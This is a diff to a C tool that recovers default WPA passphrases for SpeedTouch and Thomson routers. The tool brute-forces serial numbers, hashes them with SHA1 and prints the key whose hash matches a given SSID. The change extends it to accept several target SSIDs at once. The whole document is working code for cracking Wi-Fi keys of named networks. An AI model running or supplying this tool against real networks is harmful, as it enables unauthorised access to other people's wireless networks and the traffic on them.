@@ -71,17 +71,22 @@
 	} while (0)
 
 
+struct _WifiRouter {
+	char *ssid;
+	size_t ssid_len;
+	const char *type;
+};
+typedef struct _WifiRouter WifiRouter;
+
 struct _ThreadCtx {
 	pthread_t tid;
 	pthread_mutex_t *mutex;
 	unsigned char batch_i;
 	unsigned char batch_max;
-	const char* wanted_ssid;
-	size_t ssid_len;
 	unsigned char year_start;
 	unsigned char year_end;
 	unsigned int debian_format;
-	const char* router_type;
+	WifiRouter **routers;
 };
 typedef struct _ThreadCtx ThreadCtx;
 
@@ -95,14 +100,15 @@ process_serial (ThreadCtx *ctx, const char *serial, size_t len);
 static void*
 start_thread (void *data);
 
+static WifiRouter**
+parse_router_arg (int argc , char * const argv[]);
+
 
 int
 main (int argc , char * const argv[]) {
 	int c;
 	size_t i;
-	size_t ssid_len;
 	size_t max_threads;
-	char *wanted_ssid;
 	ThreadCtx* threads;
 	pthread_attr_t attr;
 	pthread_mutex_t mutex;
@@ -110,8 +116,7 @@ main (int argc , char * const argv[]) {
 	struct tm *now_tm;
 	unsigned char year_start = 0;
 	unsigned char year_end = 0;
-	char *ssid;
-	const char *router_type;
+	WifiRouter **routers;
 
 	struct option longopts[] = {
 		{ "year-start", required_argument, NULL, 's' },
@@ -165,37 +170,11 @@ main (int argc , char * const argv[]) {
 	argv += optind;
 
 	if (argc < 1) {
-		printf("Usage: SSID\n");
+		printf("Usage: SSID...\n");
 		return 1;
 	}
 
-	/* Allow "SpeedTouch" at the beginning of arg (for lazy pasters like me) */
-	router_type = "SpeedTouch";
-	ssid = strcasestr(argv[0], router_type);
-	if (ssid) {
-		ssid += strlen(router_type);
-	}
-
-	if (ssid == NULL) {
-		router_type = "Thomson";
-		ssid = strcasestr(argv[0], router_type);
-		if (ssid) {
-			ssid += strlen(router_type);
-		}
-	}
-
-	if (ssid == NULL) {
-		ssid = argv[0];
-		router_type = "SpeedTouch";
-	}
-
-	/* Make sure that the target SSID is in upper case */
-	ssid_len = strlen(ssid);
-	wanted_ssid = malloc(ssid_len + 1);
-	for (i = 0; i < ssid_len; ++i) {
-		wanted_ssid[i] = toupper((unsigned char) ssid[i]);
-	}
-	wanted_ssid[ssid_len] = '\0';
+	routers = parse_router_arg(argc, argv);
 
 	/* Set the current year as the last year for the serial codes to generate */
 	if (!year_end) {
@@ -222,10 +201,8 @@ main (int argc , char * const argv[]) {
 			ctx->year_start = year_start;
 			ctx->year_end = year_end;
 			ctx->debian_format = debian_format;
-			ctx->wanted_ssid = wanted_ssid;
-			ctx->ssid_len = ssid_len;
 			ctx->mutex = &mutex;
-			ctx->router_type = router_type;
+			ctx->routers = routers;
 			pthread_create(&ctx->tid, &attr, start_thread, ctx);
 		}
 
@@ -247,14 +224,20 @@ main (int argc , char * const argv[]) {
 		ctx.year_start = year_start;
 		ctx.year_end = year_end;
 		ctx.debian_format = debian_format;
-		ctx.wanted_ssid = wanted_ssid;
-		ctx.ssid_len = ssid_len;
 		ctx.mutex = NULL;
-		ctx.router_type = router_type;
+		ctx.routers = routers;
 		compute_serials(&ctx);
 	}
 
-	free(wanted_ssid);
+	for (i = 0; i < (size_t) argc; ++i) {
+		WifiRouter *router = routers[i];
+		if (router == NULL) {
+			break;
+		}
+		free(router->ssid);
+		free(router);
+	}
+	free(routers);
 	return 0;
 }
 
@@ -336,6 +319,7 @@ static void
 process_serial (ThreadCtx *ctx, const char *serial, size_t len) {
 	size_t i;
 	char *ssid;
+	WifiRouter **routers_iter;
 
 	/* Will hold the SHA1 in binary format */
 	unsigned char sha1_bin [SHA1_DIGEST_BIN_BYTES];
@@ -349,38 +333,99 @@ process_serial (ThreadCtx *ctx, const char *serial, size_t len) {
 	SHA1(SHA1_BUFFER_TYPE(serial), len - 1, sha1_bin);
 
 	/* The SSID is in the last bytes of the SHA1 when converted to hex */
-	for (i = SHA1_DIGEST_BIN_BYTES - ctx->ssid_len/2; i < SHA1_DIGEST_BIN_BYTES; ++i) {
-		unsigned char c = sha1_bin[i];
-		size_t pos = i * 2;
-		sha1_hex[pos]     = HEX(c / 16);
-		sha1_hex[pos + 1] = HEX(c % 16);
-	}
-	ssid = &sha1_hex[SHA1_DIGEST_HEX_BYTES - ctx->ssid_len];
-
-	/* If this is the desired SSID then we compute the key */
-	if (strcmp(ssid, ctx->wanted_ssid) == 0) {
-
-		/* The key is in the first 5 bytes of the SHA1 when converted to hex */
-		for (i = 0; i < 5; ++i) {
+	for (routers_iter = ctx->routers; *routers_iter != NULL; ++routers_iter) {
+		WifiRouter *router = *routers_iter;
+		for (i = SHA1_DIGEST_BIN_BYTES - router->ssid_len/2; i < SHA1_DIGEST_BIN_BYTES; ++i) {
 			unsigned char c = sha1_bin[i];
 			size_t pos = i * 2;
 			sha1_hex[pos]     = HEX(c / 16);
 			sha1_hex[pos + 1] = HEX(c % 16);
 		}
+		ssid = &sha1_hex[SHA1_DIGEST_HEX_BYTES - router->ssid_len];
 
-		if (ctx->mutex != NULL) pthread_mutex_lock(ctx->mutex);
-		if (ctx->debian_format) {
-			printf(
-				"iface speedkey inet dhcp\n"
-				"\twpa-ssid       %s%s\n"
-				"\twpa-passphrase %s\n",
-				ctx->router_type, ctx->wanted_ssid,
-				sha1_hex
-			);
+		/* If this is the desired SSID then we compute the key */
+		if (strcmp(ssid, router->ssid) == 0) {
+
+			/* The key is in the first 5 bytes of the SHA1 when converted to hex */
+			for (i = 0; i < 5; ++i) {
+				unsigned char c = sha1_bin[i];
+				size_t pos = i * 2;
+				sha1_hex[pos]     = HEX(c / 16);
+				sha1_hex[pos + 1] = HEX(c % 16);
+			}
+
+			if (ctx->mutex != NULL) pthread_mutex_lock(ctx->mutex);
+			if (ctx->debian_format) {
+				printf(
+					"iface speedkey inet dhcp\n"
+					"\twpa-ssid       %s%s\n"
+					"\twpa-passphrase %s\n",
+					router->type, router->ssid,
+					sha1_hex
+				);
+			}
+			else {
+				printf("Matched SSID %s, key: %s\n", router->ssid, sha1_hex);
+			}
+			if (ctx->mutex != NULL) pthread_mutex_unlock(ctx->mutex);
 		}
-		else {
-			printf("Matched SSID %s, key: %s\n", ctx->wanted_ssid, sha1_hex);
-		}
-		if (ctx->mutex != NULL) pthread_mutex_unlock(ctx->mutex);
 	}
+}
+
+
+static WifiRouter**
+parse_router_arg (int argc , char * const argv[]) {
+
+	WifiRouter **routers;
+	int i;
+
+	routers = (WifiRouter **) malloc((argc + 1) * sizeof(WifiRouter *));
+	if (routers == NULL) {
+		return NULL;
+	}
+	routers[argc] = NULL;
+
+	for (i = 0; i < argc; ++i) {
+		const char *arg;
+		WifiRouter *router;
+		const char *ssid;
+		size_t j;
+
+		arg = argv[i];
+		routers[i] = router = (WifiRouter *) malloc(sizeof(WifiRouter));
+		if (router == NULL) {
+			return NULL;
+		}
+
+		/* Allow "SpeedTouch" at the beginning of arg (for lazy pasters like me) */
+		router->type = "SpeedTouch";
+		ssid = strcasestr(arg, router->type);
+		if (ssid) {
+			ssid += strlen(router->type);
+		}
+
+		if (ssid == NULL) {
+			router->type = "Thomson";
+			ssid = strcasestr(arg, router->type);
+			if (ssid) {
+				ssid += strlen(router->type);
+			}
+		}
+
+		if (ssid == NULL) {
+			ssid = arg;
+			router->type = "SpeedTouch";
+		}
+
+		/* Make sure that the target SSID is in upper case */
+		router->ssid_len = strlen(ssid);
+		router->ssid = malloc(router->ssid_len + 1);
+
+		for (j = 0; j < router->ssid_len; ++j) {
+			router->ssid[j] = toupper((unsigned char) ssid[j]);
+		}
+		router->ssid[router->ssid_len] = '\0';
+	}
+
+	return routers;
 }
